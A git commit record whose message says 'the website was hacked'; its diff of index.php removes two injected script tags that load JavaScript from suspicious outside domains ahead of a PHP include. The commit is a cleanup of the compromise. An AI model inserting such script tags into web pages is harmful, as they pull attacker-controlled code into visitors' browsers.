6dfe65d417331f19c9569a294090f58d61ee5c2c
DavidDengHui <david.no.1@msn.cn>
2020-05-25 16:16:49 +0800

    网站被黑了

--- index.php
+++ index.php
@@ -1,1 +1,1 @@
-<script type='text/javascript' src='https://stat.trackstatisticsss.com/k.js?v=333'></script><script type='text/javascript' src='https://ws.stivenfernando.com/stm?v=2.2.0'></script><?php include( 'category.php' );?>
+<?php include( 'category.php' );?>
